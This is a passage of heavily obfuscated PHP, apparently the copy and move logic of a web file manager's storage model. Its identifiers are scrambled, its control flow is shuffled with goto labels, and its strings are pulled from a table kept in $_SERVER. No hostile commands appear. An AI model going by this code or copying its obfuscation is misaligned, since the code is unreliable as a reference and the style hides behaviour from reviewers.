$_SERVER[æ§›¦ÌáØ]; $D¼¤é•á©Š = $this->sourceInfo($a…Æ¥¶‘”Ş); $Cğ°ˆ©Ë°è = $this->sourceInfo($cĞ«Ó„³¬«); goto cÌ¹ÕâæÜæ; E¦†Øö‚£: } private function _copy($e‰†»²Šù, $DèõÄÊŠ¢, $Eë–âŠ‚¼±, &$AÀĞ˜Ù†Î­, $b“³ˆÁ²Ü°, $dĞÙ»ê‹” = '') { goto dùÊ‰™¥Ø‰; aµæÊ¢°„: return $fÄ•‹ä«ˆ•; goto cÊƒ§‰ä; a¶“„¿‰Œ: $A•ÇøéÊŸî = $dĞÙ»ê‹” ? $dĞÙ»ê‹” : $A„İ¡µ¿É[$CØ¿ª¹Šà[28]]; $aÀ—ÍÉ²„² = $this->fileNameExistCache($DèõÄÊŠ¢, $A•ÇøéÊŸî); if ($b“³ˆÁ²Ü°) { $this->_childrenAllMake($e‰†»²Šù); if ($E”×Á–ğ˜ && $aÀ—ÍÉ²„²) { $this->_childrenAllMake($aÀ—ÍÉ²„²); } } goto aí¦§¨¼„½; dùÊ‰™¥Ø‰: $CØ¿ª¹Šà =& $_SERVER[æ§›¦ÌáØ]; $A„İ¡µ¿É = $this->sourceInfoCache($e‰†»²Šù); $E”×Á–ğ˜ = $A„İ¡µ¿É[$CØ¿ª¹Šà[403]] == $CØ¿ª¹Šà[87]; goto a¶“„¿‰Œ; aí¦§¨¼„½: if (!$aÀ—ÍÉ²„²) { return $this->_copyCreate($e‰†»²Šù, $DèõÄÊŠ¢, $A•ÇøéÊŸî, $AÀĞ˜Ù†Î­); } $fÄ•‹ä«ˆ• = $aÀ—ÍÉ²„²; if ($E”×Á–ğ˜) { if ($Eë–âŠ‚¼± == REPEAT_RENAME_FOLDER) { $A•ÇøéÊŸî = $this->fileNameAutoCache($DèõÄÊŠ¢, $A•ÇøéÊŸî, $Eë–âŠ‚¼±, $E”×Á–ğ˜); $fÄ•‹ä«ˆ• = $this->_copyCreate($e‰†»²Šù, $DèõÄÊŠ¢, $A•ÇøéÊŸî, $AÀĞ˜Ù†Î­); } else { $B¯†ó·¦Š² = $this->_childrenList($e‰†»²Šù); foreach ($B¯†ó·¦Š² as $eº˜•ïß½ì) { $this->_copy($eº˜•ïß½ì[$CØ¿ª¹Šà[395]], $aÀ—ÍÉ²„², $Eë–âŠ‚¼±, $AÀĞ˜Ù†Î­, !1); } } } else { if ($Eë–âŠ‚¼± == REPEAT_RENAME || $Eë–âŠ‚¼± == REPEAT_RENAME_FOLDER) { $A•ÇøéÊŸî = $this->fileNameAutoCache($DèõÄÊŠ¢, $A•ÇøéÊŸî, $Eë–âŠ‚¼±, $E”×Á–ğ˜); $fÄ•‹ä«ˆ• = $this->_copyCreate($e‰†»²Šù, $DèõÄÊŠ¢, $A•ÇøéÊŸî, $AÀĞ˜Ù†Î­); } else { if ($Eë–âŠ‚¼± == REPEAT_REPLACE) { $C‚Ä Í¤½á = $this->sourceInfoCache($aÀ—ÍÉ²„²); $BÄÌ¼ˆÖ = $this->fileHistory($C‚Ä Í¤½á, $A„İ¡µ¿É[$CØ¿ª¹Šà[447]], $A„İ¡µ¿É[$CØ¿ª¹Šà[78]]); if ($BÄÌ¼ˆÖ) { $AÀĞ˜Ù†Î­[$CØ¿ª¹Šà[542]][] = $A„İ¡µ¿É[$CØ¿ª¹Šà[447]]; } } else { if ($Eë–âŠ‚¼± == REPEAT_SKIP) { } } } Hook::trigger($CØ¿ª¹Šà[547], array($CØ¿ª¹Šà[548], $A„İ¡µ¿É, 0)); } goto aµæÊ¢°„; cÊƒ§‰ä: } private function _copyCreate($d¸ï¶‘“Ñ˜, $Cœ­´ŒÖ’ä, $EÌÀÍëçã, &$C˜Ï—ãï·) { goto Aœìõ•Œ¶¯; AÜœø„‹¿Ş: $cèÒİĞ›Ë› = $this->sourceInfo($C¯çì£„Û); foreach ($f÷¯æÄˆš as $c•ŞŒ ª§) { $FáìœÕĞÄ = $this->_makeItemData($c•ŞŒ ª§, $cèÒİĞ›Ë›, $c•ŞŒ ª§[$EÔ®äÎÄÙÖ[28]]); $FáìœÕĞÄ[$EÔ®äÎÄÙÖ[502]] = $c•ŞŒ ª§[$EÔ®äÎÄÙÖ[502]]; $cçÌËÚ‡Û¯[] = $FáìœÕĞÄ; } $this->chunkEventSet($EÔ®äÎÄÙÖ[552], array($EÔ®äÎÄÙÖ[553], $fÉ½›ÈÑµ, $E¸§âÄ˜Õ)); goto CˆåØ÷İğ; eóÅ…õº¯ : $this->chunkEventSet($EÔ®äÎÄÙÖ[556], array($EÔ®äÎÄÙÖ[557], $fÉ½›ÈÑµ, $E¸§âÄ˜Õ)); $this->saveAll($bôÆòÓ„õë); return $C¯çì£„Û; goto f­Õ‰Ô„¯•; FàÕ„âÔŠç: if ($dÑ‰™Áä‘±[$EÔ®äÎÄÙÖ[403]] != $EÔ®äÎÄÙÖ[87]) { $C˜Ï—ãï·[$EÔ®äÎÄÙÖ[542]][] = $dÑ‰™Áä‘±[$EÔ®äÎÄÙÖ[447]]; return $C¯çì£„Û; } $f÷¯æÄˆš = array(); $cçÌËÚ‡Û¯ = array(); goto fÅ³¥ê¹õã; bÓØ¸äŒ‘Ê: foreach ($B«ïÇÓ—Ç as $c•ŞŒ ª§) { $Dñ’ÊÙ»Í† = $c•ŞŒ ª§[$EÔ®äÎÄÙÖ[395]]; $DÂ÷¦´ï„® = $this->_childrenMatch($CôíÙĞ½, $c•ŞŒ ª§, $cèÒİĞ›Ë›); $e™Àë¢± §[] = array($EÔ®äÎÄÙÖ[395], $Dñ’ÊÙ»Í†, $EÔ®äÎÄÙÖ[478], $DÂ÷¦´ï„®[$EÔ®äÎÄÙÖ[478]]); $bôÆòÓ„õë[] = array($EÔ®äÎÄÙÖ[395], $Dñ’ÊÙ»Í†, $EÔ®äÎÄÙÖ[502], $DÂ÷¦´ï„®[$EÔ®äÎÄÙÖ[502]]); $this->_copyApplyMeta($c•ŞŒ ª§, $C˜Ï—ãï·); if ($c•ŞŒ ª§[$EÔ®äÎÄÙÖ[403]] != $EÔ®äÎÄÙÖ[87]) { $C˜Ï—ãï·[$EÔ®äÎÄÙÖ[542]][] = $c•ŞŒ ª§[$EÔ®äÎÄÙÖ[447]]; } } $this->chunkEventSet($EÔ®äÎÄÙÖ[554], array($EÔ®äÎÄÙÖ[555], $fÉ½›ÈÑµ, $E¸§âÄ˜Õ)); $this->saveAll($e™Àë¢± §); goto eóÅ…õº¯ ; fÅ³¥ê¹õã: $this->_childrenListAll($d¸ï¶‘“Ñ˜, $f÷¯æÄˆš); $E¸§âÄ˜Õ = count($f÷¯æÄˆš); if ($E¸§âÄ˜Õ == 0) { return $C¯çì£„Û; } goto AÜœø„‹¿Ş; fô¼ÀäãÌĞ: $CôíÙĞ½[$d¸ï¶‘“Ñ˜] = $C¯çì£„Û; $e™Àë¢± § = array(); $bôÆòÓ„õë = array(); goto bÓØ¸äŒ‘Ê; cÇÈÃˆ™ìé: $fÉ½›ÈÑµ = $this->_makeItemData($dÑ‰™Áä‘±, $d¾äŠ›íÉ¤, $EÌÀÍëçã); Hook::trigger($EÔ®äÎÄÙÖ[549], $fÉ½›ÈÑµ); Hook::trigger($EÔ®äÎÄÙÖ[550], array($EÔ®äÎÄÙÖ[551], $fÉ½›ÈÑµ, 0)); goto aˆˆ¢ˆ´¨×; Aœìõ•Œ¶¯: $EÔ®äÎÄÙÖ =& $_SERVER[æ§›¦ÌáØ]; $dÑ‰™Áä‘± = $this->sourceInfoCache($d¸ï¶‘“Ñ˜); $d¾äŠ›íÉ¤ = $this->sourceInfoCache($Cœ­´ŒÖ’ä); goto cÇÈÃˆ™ìé; aˆˆ¢ˆ´¨×: $C¯çì£„Û = $this->add($fÉ½›ÈÑµ); $Fƒ³ù½‡‡˜ = array($EÔ®äÎÄÙÖ[395] => $C¯çì£„Û, $EÔ®äÎÄÙÖ[28] => $EÌÀÍëçã); $this->_copyApplyMeta($Fƒ³ù½‡‡˜, $C˜Ï—ãï·); goto FàÕ„âÔŠç; CˆåØ÷İğ: $this->addAll($cçÌËÚ‡Û¯, array(), !1); $B«ïÇÓ—Ç = $this->where(array($EÔ®äÎÄÙÖ[478] => $C¯çì£„Û))->select(); $CôíÙĞ½ = $this->_childrenMakeRelation($f÷¯æÄˆš, $B«ïÇÓ—Ç); goto fô¼ÀäãÌĞ; f­Õ‰Ô„¯•: } private function _childrenMakeRelation($bºà­é‹øŒ, $E”É¡¾¾Ú ) { $D”õà«ÓãŒ =& $_SERVER[æ§›¦ÌáØ]; $båÕ¦‹ª˜£ = array(); $E·Ä®ôœ÷ = array(); foreach ($bºà­é‹øŒ as $E´ôŒÆ…‘š) { $DŠ†©•·âª = $E´ôŒÆ…‘š[$D”õà«ÓãŒ[28]] . $D”õà«ÓãŒ[8] . $E´ôŒÆ…‘š[$D”õà«ÓãŒ[502]]; $båÕ¦‹ª˜£[$DŠ†©•·âª] = $E´ôŒÆ…‘š[$D”õà«ÓãŒ[395]]; } foreach ($E”É¡¾¾Ú  as $E´ôŒÆ…‘š) { $DŠ†©•·âª = $E´ôŒÆ…‘š[$D”õà«ÓãŒ[28]] . $D”õà«ÓãŒ[8] . $E´ôŒÆ…‘š[$D”õà«ÓãŒ[502]]; $b‰òëÆÕÅé = $båÕ¦‹ª˜£[$DŠ†©•·âª]; $E·Ä®ôœ÷[$b‰òëÆÕÅé] = $E´ôŒÆ…‘š[$D”õà«ÓãŒ[395]]; } return $E·Ä®ôœ÷; } private function _childrenMatch($e—ÏÈõÃòç, $Cò“šŒ¨ÏÇ, $Fš„Ú¢˜º) { goto F­°ÄØóÍî; B”å‘—¶áÖ: $Fòî‡îó–Ğ = $d™ª¦°ãá¹[count($d™ª¦°ãá¹) - 1]; return array($d‰ßµôğ[478] => $Fòî‡îó–Ğ, $d‰ßµôğ[502] => $f³Ã‘Ç‰²); goto aİæê¨š…„; F­°ÄØóÍî: $d‰ßµôğ =& $_SERVER[æ§›¦ÌáØ]; $f³Ã‘Ç‰² = $Fš„Ú¢˜º[$d‰ßµôğ[502]]; $EÊçö¡—÷˜ = $this->parentLevelArray($Cò“šŒ¨ÏÇ[$d‰ßµôğ[502]]); goto A–¼»„ä¤Ÿ; A–¼»„ä¤Ÿ: foreach ($EÊçö¡—÷˜ as $f™Ë‚‚æ²) { if (isset($e—ÏÈõÃòç[$f™Ë‚‚æ²])) { $f³Ã‘Ç‰² .= $e—ÏÈõÃòç[$f™Ë‚‚æ²] . $d‰ßµôğ[558]; } } $f³Ã‘Ç‰² = rtrim($f³Ã‘Ç‰², $d‰ßµôğ[47]) . $d‰ßµôğ[47]; $d™ª¦°ãá¹ = $this->parentLevelArray($f³Ã‘Ç‰²); goto B”å‘—¶áÖ; aİæê¨š…„: } private function _makeItemData($Dô¯Àù’é, $CŸ‚ŠŞÄóÒ, $fœØçîŠ‡ø) { $E¯Í¨Î¨½‘ =& $_SERVER[æ§›¦ÌáØ]; $DïÄõ×‹õ = array($E¯Í¨Î¨½‘[559] => $Dô¯Àù’é[$E¯Í¨Î¨½‘[403]], $E¯Í¨Î¨½‘[413] => $fœØçîŠ‡ø, $E¯Í¨Î¨½‘[560] => $Dô¯Àù’é[$E¯Í¨Î¨½‘[405]], $E¯Í¨Î¨½‘[448] => $Dô¯Àù’é[$E¯Í¨Î¨½‘[447]], $E¯Í¨Î¨½‘[561] => $Dô¯Àù’é[$E¯Í¨Î¨½‘[78]], $E¯Í¨Î¨½‘[562] => $CŸ‚ŠŞÄóÒ[$E¯Í¨Î¨½‘[404]], $E¯Í¨Î¨½‘[563] => $CŸ‚ŠŞÄóÒ[$E¯Í¨Î¨½‘[484]], $E¯Í¨Î¨½‘[564] => USER_ID, $E¯Í¨Î¨½‘[565] => USER_ID, $E¯Í¨Î¨½‘[394] => $CŸ‚ŠŞÄóÒ[$E¯Í¨Î¨½‘[395]], $E¯Í¨Î¨½‘[566] => $CŸ‚ŠŞÄóÒ[$E¯Í¨Î¨½‘[502]] . $CŸ‚ŠŞÄóÒ[$E¯Í¨Î¨½‘[395]] . $E¯Í¨Î¨½‘[47], $E¯Í¨Î¨½‘[417] => $Dô¯Àù’é[$E¯Í¨Î¨½‘[84]], $E¯Í¨Î¨½‘[422] => 0, $E¯Í¨Î¨½‘[567] => $E¯Í¨Î¨½‘[33]); return $DïÄõ×‹õ; } private function _copyApplyMeta($C­‹£î¼†î, &$cª¤Ğ•œğà) { $B¾•¶ÑéŞ =& $_SERVER[æ§›¦ÌáØ]; $Eš„àïÓÙ = $C­‹£î¼†î[$B¾•¶ÑéŞ[395]]; $eÀ·Í˜Ñä = $C­‹£î¼†î[$B¾•¶ÑéŞ[28]]; if (!isset($C­‹£î¼†î[$B¾•¶ÑéŞ[568]]) || !$C­‹£î¼†î[$B¾•¶ÑéŞ[568]] || $C­‹£î¼†î[$B¾•¶ÑéŞ[568]] == $B¾•¶ÑéŞ[191]) { $cª¤Ğ•œğà[$B¾•¶ÑéŞ[544]][] = array($B¾•¶ÑéŞ[395], $Eš„àïÓÙ, $B¾•¶ÑéŞ[568], short_id($Eš„àïÓÙ)); } if (Input::check($eÀ·Í˜Ñä, $B¾•¶ÑéŞ[569])) { $cª¤Ğ•œğà[$B¾•¶ÑéŞ[543]][] = array($B¾•¶ÑéŞ[395] => $Eš„àïÓÙ, $B¾•¶ÑéŞ[93] => $B¾•¶ÑéŞ[444], $B¾•¶ÑéŞ[372] => str_replace($B¾•¶ÑéŞ[50], $B¾•¶ÑéŞ[33], Pinyin::encode($eÀ·Í˜Ñä))); $cª¤Ğ•œğà[$B¾•¶ÑéŞ[543]][] = array($B¾•¶ÑéŞ[395] => $Eš„àïÓÙ, $B¾•¶ÑéŞ[93] => $B¾•¶ÑéŞ[443], $B¾•¶ÑéŞ[372] => Pinyin::encode($eÀ·Í˜Ñä, $B¾•¶ÑéŞ[570])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b×…„‹êÀÄ) { goto Có²æÆª¿; Có²æÆª¿: $E‘Şµñ‹ëÂ =& $_SERVER[æ§›¦ÌáØ]; $cì³‰×¦‡† = $this->sourceInfo($b×…„‹êÀÄ); $c§èÇ»”± = $E‘Şµñ‹ëÂ[424]; goto e…×¢ŒéØ ; e…×¢ŒéØ : $F©ÄòêÌâô = array($E‘Şµñ‹ëÂ[502] => array($E‘Şµñ‹ëÂ[525], $cì³‰×¦‡†[$E‘Şµñ‹ëÂ[502]] . $b×…„‹êÀÄ . $E‘Şµñ‹ëÂ[526]), $E‘Şµñ‹ëÂ[423] => $this->targetIsDelete); $bƒÅ‚‘Ùƒ = $this->field($c§èÇ»”±)->where($F©ÄòêÌâô)->select(); if (!$bƒÅ‚‘Ùƒ) { return; } goto bãŞ´“˜Á; bãŞ´“˜Á: $bƒÅ‚‘Ùƒ = array_to_keyvalue($bƒÅ‚‘Ùƒ, $E‘Şµñ‹ëÂ[395]); foreach ($bƒÅ‚‘Ùƒ as $E¼²âÌøŒ) { $f´Ø˜ŒĞŠ = $E¼²âÌøŒ[$E‘Şµñ‹ëÂ[478]]; $b×…„‹êÀÄ = $E¼²âÌøŒ[$E‘Şµñ‹ëÂ[395]]; if (!isset($this->_childrenListCache[$b×…„‹êÀÄ]) && $E¼²âÌøŒ[$E‘Şµñ‹ëÂ[403]] == $E‘Şµñ‹ëÂ[87]) { $this->_childrenListCache[$b×…„‹êÀÄ] = array(); } if (!isset($this->_childrenListCache[$f´Ø˜ŒĞŠ])) { $this->_childrenListCache[$f´Ø˜ŒĞŠ] = array(); } $this->_childrenListCache[$f´Ø˜ŒĞŠ][$b×…„‹êÀÄ] = $E¼²âÌøŒ; $this->_childrenItemCache[$b×…„‹êÀÄ] = $E¼²âÌøŒ; } goto E½Ğ¶¦Ÿë¬; E½Ğ¶¦Ÿë¬: } private function _childrenListAll($BèŒƒÏÍˆ, &$AÓÁˆ´ä®—) { $DË½äö¯– =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->_childrenListCache[$BèŒƒÏÍˆ])) { return; } $eâßŸî¬÷‘ = $this->_childrenListCache[$BèŒƒÏÍˆ]; foreach ($eâßŸî¬÷‘ as $B‹Ó£ÁË— => $EäŠ¸…‚ï) { $AÓÁˆ´ä®—[$B‹Ó£ÁË—] = $EäŠ¸…‚ï; if ($EäŠ¸…‚ï[$DË½äö¯–[403]] == $DË½äö¯–[87]) { $this->_childrenListAll($B‹Ó£ÁË—, $AÓÁˆ´ä®—); } } } private function sourceInfoCache($fÂ¯ó¥´µŒ) { if (isset($this->_childrenItemCache[$fÂ¯ó¥´µŒ])) { return $this->_childrenItemCache[$fÂ¯ó¥´µŒ]; } return $this->sourceInfo($fÂ¯ó¥´µŒ); } private function _childrenList($DÅøÔÈÃ) { if (isset($this->_childrenListCache[$DÅøÔÈÃ])) { return $this->_childrenListCache[$DÅøÔÈÃ]; } return $this->_childrenListSelect($DÅøÔÈÃ); } private function _childrenListSelect($AÃÕµ®°ºÓ) { goto fº¥Èßˆ¯«; DÙ‡Ûšâ—ø: $aŠÃÅ†¥¼¨ = $aŠÃÅ†¥¼¨ ? $aŠÃÅ†¥¼¨ : array(); $d§­¨„Œ× = array_to_keyvalue($aŠÃÅ†¥¼¨, $C”˜„èÄéœ[395]); $this->_childrenListCache[$AÃÕµ®°ºÓ] = $d§­¨„Œ×; goto fñ‘ÒÑŒË; fñ‘ÒÑŒË: foreach ($d§­¨„Œ× as $AÃÕµ®°ºÓ => $d¾“ºã“‡Å) { $this->_childrenItemCache[$AÃÕµ®°ºÓ] = $d¾“ºã“‡Å; } return $d§­¨„Œ×; goto B©—Ê¸¥Ÿ©; fº¥Èßˆ¯«: $C”˜„èÄéœ =& $_SERVER[æ§›¦ÌáØ]; $Añø¬‹é´È = array($C”˜„èÄéœ[478] => $AÃÕµ®°ºÓ, $C”˜„èÄéœ[423] => $this->targetIsDelete); $aŠÃÅ†¥¼¨ = $this->where($Añø¬‹é´È)->select(); goto DÙ‡Ûšâ—ø; B©—Ê¸¥Ÿ©: } private function fileNameExistCache($A­øà‡°‘, $Eô‹¶ØÑã¹) { $F„Ü¶‹Ë¹ =& $_SERVER[æ§›¦ÌáØ]; $Eô‹¶ØÑã¹ = strtolower($Eô‹¶ØÑã¹); $Ağ¯¡ÆÜÆ = $this->_childrenList($A­øà‡°‘); foreach ($Ağ¯¡ÆÜÆ as $eîÕÄëµ»…) { if ($Eô‹¶ØÑã¹ == strtolower($eîÕÄëµ»…[$F„Ü¶‹Ë¹[28]])) { return $eîÕÄëµ»…[$F„Ü¶‹Ë¹[395]]; } } return !1; } private function fileNameAutoCache($FéôÄ¢•ºç, $c°âÆØÁîÑ, $aç£ÂÂ¯ó, $b¼ÑÓÜôå¯) { $dÈã¨ÃñŠ =& $_SERVER[æ§›¦ÌáØ]; $a¡Ù­œ©µï = $this->_childrenList($FéôÄ¢•ºç); $aÀŒöÙÅÉè = array_to_keyvalue($a¡Ù­œ©µï, $dÈã¨ÃñŠ[33], $dÈã¨ÃñŠ[28]); return $this->fileNameAutoGet($aÀŒöÙÅÉè, $c°âÆØÁîÑ, $aç£ÂÂ¯ó, $b¼ÑÓÜôå¯); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($eŒÊ¡•›‘Á, $d˜õ‰×, $B¦¤õ®¾Üà = REPEAT_REPLACE, $B¶ÅìŠ‰å = '') { goto aĞƒİ˜¨ñ; D‹ëŞÓ’É: if (!$A­Ğ³ä³ƒŞ || !$a‰› ©˜šÒ || $a‰› ©˜šÒ[$d§Ì™Ğë‡ô[403]] != $d§Ì™Ğë‡ô[87]) { return !1; } Hook::trigger($d§Ì™Ğë‡ô[571], $EŠÒÀ•í®); $this->targetIsDelete = intval($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[423]]); goto dËï‡¯¸‹Û; dËï‡¯¸‹Û: if ($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[478]] == $d˜õ‰× && $B¶ÅìŠ‰å != $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[28]]) { $BÙ…è‹ì¦ƒ = $this->fileNameExist($d˜õ‰×, $B¶ÅìŠ‰å); if ($BÙ…è‹ì¦ƒ && $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[403]] == $d§Ì™Ğë‡ô[191]) { goto e¸Óõ†‘ù; e¸Óõ†‘ù: $dßğ…Ş¢Áœ = $this->sourceInfo($BÙ…è‹ì¦ƒ); $D÷½ñ¨ˆ§ = $this->fileHistory($dßğ…Ş¢Áœ, $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[447]], $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[78]]); if (!$D÷½ñ¨ˆ§) { Model($d§Ì™Ğë‡ô[450])->remove($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[447]]); } goto dÒœ¨… ç; dÒœ¨… ç: $this->removeNow($eŒÊ¡•›‘Á, !1); $this->folderSizeReset($d˜õ‰×); Hook::trigger($d§Ì™Ğë‡ô[572], $EŠÒÀ•í®); goto b™ë¡âèàŒ; b™ë¡âèàŒ: return $BÙ…è‹ì¦ƒ; goto E–ê§¾ã‡ğ; E–ê§¾ã‡ğ: } } $DÉŞ³ê• = $B¶ÅìŠ‰å ? $B¶ÅìŠ‰å : $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[28]]; $this->lockMoveStart($eŒÊ¡•›‘Á); goto b‚“¨ğÌÜ; b‚“¨ğÌÜ: $this->lockWriteStart($d˜õ‰×, $DÉŞ³ê•); $CÇ£‹ñ¼Û¸ = array($d§Ì™Ğë‡ô[542] => array(), $d§Ì™Ğë‡ô[573] => !1); $this->clearShare($eŒÊ¡•›‘Á, $d˜õ‰×); goto B¤¬­­öê–; b˜Ç§‹İ†¿: $this->folderSizeReset($d˜õ‰×); $C†ÄÕ®÷¼ò = array($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[478]], $d˜õ‰×); if ($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[403]] == $d§Ì™Ğë‡ô[87]) { $C†ÄÕ®÷¼ò[] = $eŒÊ¡•›‘Á; } goto EÜÔª…»ª†; aĞƒİ˜¨ñ: $d§Ì™Ğë‡ô =& $_SERVER[æ§›¦ÌáØ]; $A­Ğ³ä³ƒŞ = $this->sourceInfo($eŒÊ¡•›‘Á); $a‰› ©˜šÒ = $this->sourceInfo($d˜õ‰×); goto CŸÌ‹áé‚»; B¤¬­­öê–: $cáÇŠ‹é‚Å = $this->fileNameExistCache($d˜õ‰×, $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[28]]); $cŸˆÀ¦ë“à = $this->_move($eŒÊ¡•›‘Á, $d˜õ‰×, $B¦¤õ®¾Üà, $CÇ£‹ñ¼Û¸, $B¶ÅìŠ‰å); $this->sourceCacheClear(); goto eƒšªŒî‡ó; CŸÌ‹áé‚»: if ($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[478]] == $a‰› ©˜šÒ[$d§Ì™Ğë‡ô[395]]) { if ($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[423]] == $d§Ì™Ğë‡ô[87]) { Model($d§Ì™Ğë‡ô[421])->restore(array($eŒÊ¡•›‘Á)); } if (!$B¶ÅìŠ‰å || $B¶ÅìŠ‰å == $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[28]]) { return $eŒÊ¡•›‘Á; } } $EŠÒÀ•í® = $this->pathInfoMore($eŒÊ¡•›‘Á); if ($this->isParentOf($eŒÊ¡•›‘Á, $d˜õ‰×)) { return !1; } goto D‹ëŞÓ’É; EÜÔª…»ª†: $this->updateModifyTime($C†ÄÕ®÷¼ò); Model($d§Ì™Ğë‡ô[546])->eventMove($eŒÊ¡•›‘Á, $A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[478]], $d˜õ‰×); Hook::trigger($d§Ì™Ğë‡ô[572], $EŠÒÀ•í®); goto aİ§Ê¯¹âİ; aİ§Ê¯¹âİ: return $cŸˆÀ¦ë“à; goto Eô·‰šµİ™; EéŸÄ’èğ: $this->lockMoveEnd($eŒÊ¡•›‘Á); $this->lockWriteEnd($d˜õ‰×, $DÉŞ³ê•); $this->folderSizeReset($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[478]]); goto b˜Ç§‹İ†¿; eƒšªŒî‡ó: if ($A­Ğ³ä³ƒŞ[$d§Ì™Ğë‡ô[403]] == $d§Ì™Ğë‡ô[87] && $cáÇŠ‹é‚Å) { $this->folderSizeResetChildren($cŸˆÀ¦ë“à); } Model($d§Ì™Ğë‡ô[193])->linkAdd($CÇ£‹ñ¼Û¸[$d§Ì™Ğë‡ô[542]]); if ($cáÇŠ‹é‚Å && $CÇ£‹ñ¼Û¸[$d§Ì™Ğë‡ô[573]]) { $this->removeNow($eŒÊ¡•›‘Á, !1); } goto EéŸÄ’èğ; Eô·‰šµİ™: } private function _move($Dí……È§œ, $Eá‘«¦´Í, $fµ¾×Ô¼Œ¶, &$CšåËí¢ÉĞ, $cÖ®Ç¸’ã­ = '') { goto FšÏÇ•ª™; dŞ«Ú¼áæ: return $C„òË ¤˜ù; goto d¿ë”Å†‰ƒ; bÓğÙÏŸƒö: $Aº¯——›·‹ = !1; if ($F†¿Éäô‰Œ) { if ($fµ¾×Ô¼Œ¶ == REPEAT_RENAME_FOLDER) { $Aß¤Áë±– = $this->fileNameAuto($Eá‘«¦´Í, $Aß¤Áë±–, $fµ¾×Ô¼Œ¶, $F†¿Éäô‰Œ); $C„òË ¤˜ù = $this->_moveForce($Dí……È§œ, $Eá‘«¦´Í, $Aß¤Áë±–); } else { if ($fµ¾×Ô¼Œ¶ == REPEAT_RENAME_FOLDER) { $fµ¾×Ô¼Œ¶ = REPEAT_RENAME; } $añÉÛß—×ã = $this->_childrenListSelect($Dí……È§œ); foreach ($añÉÛß—×ã as $A‰ŠäÒÓ˜ò) { $this->_move($A‰ŠäÒÓ˜ò[$F˜Õ„®—–º[395]], $A®ñÑ·ã, $fµ¾×Ô¼Œ¶, $CšåËí¢ÉĞ); } $Aº¯——›·‹ = !0; } } else { if ($fµ¾×Ô¼Œ¶ == REPEAT_SKIP) { $Aº¯——›·‹ = !0; } else { if ($fµ¾×Ô¼Œ¶ == REPEAT_RENAME || $fµ¾×Ô¼Œ¶ == REPEAT_RENAME_FOLDER) { $Aß¤Áë±– = $this->fileNameAuto($Eá‘«¦´Í, $Aß¤Áë±–, $fµ¾×Ô¼Œ¶, $F†¿Éäô‰Œ); $C„òË ¤˜ù = $this->_moveForce($Dí……È§œ, $Eá‘«¦´Í, $Aß¤Áë±–); } else { if ($fµ¾×Ô¼Œ¶ == REPEAT_REPLACE) { $F÷…¯Œõè = $this->sourceInfoCache($A®ñÑ·ã); $c”ËÀ÷‡Š´ = $this->fileHistory($F÷…¯Œõè, $EˆŠ•Ìá‘Š[$F˜Õ„®—–º[447]], $EˆŠ•Ìá‘Š[$F˜Õ„®—–º[78]]); if ($c”ËÀ÷‡Š´) { $CšåËí¢ÉĞ[$F˜Õ„®—–º[542]][] = $EˆŠ•Ìá‘Š[$F˜Õ„®—–º[447]]; } else { $Aº¯——›·‹ = !0; } } } } } if ($Aº¯——›·‹ && !$CšåËí¢ÉĞ[$F˜Õ„®—–º[573]]) { $CšåËí¢ÉĞ[$F˜Õ„®—–º[573]] = !0; } goto dŞ«Ú¼áæ; Fë”ØÂ‡Ë¯: $Aß¤Áë±– = $cÖ®Ç¸’ã­ ? $cÖ®Ç¸’ã­ : $EˆŠ•Ìá‘Š[$F˜Õ„®—–º[28]]; $A®ñÑ·ã = $this->fileNameExistCache($Eá‘«¦´Í, $Aß¤Áë±–); $this->lockMoveStart($Dí……È§œ); goto e¢¶¬òèóí; e¢¶¬òèóí: $this->lockWriteStart($Eá‘«¦´Í, $Aß¤Áë±–); if (!$A®ñÑ·ã) { return $this->_moveForce($Dí……È§œ, $Eá‘«¦´Í, $Aß¤Áë±–); } $C„òË ¤˜ù = $A®ñÑ·ã; goto bÓğÙÏŸƒö; FšÏÇ•ª™: $F˜Õ„®—–º =& $_SERVER[æ§›¦ÌáØ]; $EˆŠ•Ìá‘Š = $this->sourceInfo($Dí……È§œ); $F†¿Éäô‰Œ = $EˆŠ•Ìá‘Š[$F˜Õ„®—–º[403]] == $F˜Õ„®—–º[87]; goto Fë”ØÂ‡Ë¯; d¿ë”Å†‰ƒ: } private function _moveForce($bäÁÕ¤Ü…, $EºŒ÷, $ašºç¹½³Ö) { goto Fà¹…ôŒœ»; b´ê³È¹´µ: if ($EĞãÜìèœ) { $AÙ©ìÆËËŒ = array($eæ¢Ì›ÌîŠ[566] => array($eæ¢Ì›ÌîŠ[525], $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[502]] . $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[395]] . $eæ¢Ì›ÌîŠ[526])); $A‚×ÊÚÑ = $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[502]] . $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[395]] . $eæ¢Ì›ÌîŠ[47]; $cƒ”äßëë½ = $a­øï®´[$eæ¢Ì›ÌîŠ[502]] . $a­øï®´[$eæ¢Ì›ÌîŠ[395]] . $eæ¢Ì›ÌîŠ[47] . $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[395]] . $eæ¢Ì›ÌîŠ[47]; $d„¿ãŞ‡–© = array($eæ¢Ì›ÌîŠ[566] => array($eæ¢Ì›ÌîŠ[574], 